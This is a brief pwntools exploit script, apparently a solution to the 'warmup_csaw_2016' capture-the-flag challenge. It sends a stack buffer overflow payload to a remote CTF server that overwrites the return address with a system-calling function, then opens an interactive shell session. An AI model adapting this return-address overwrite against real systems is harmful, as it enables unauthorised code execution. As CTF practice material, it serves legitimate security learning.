from pwn import *

#p = process('./warmup_csaw_2016')
p = remote('node3.buuoj.cn', 27649)

system_addr = 0x40060d
ret = 0x4004a1

payload = b'a' * ( 0x40 + 8 ) + p64(ret) + p64(system_addr)

p.sendline(payload)

p.interactive()
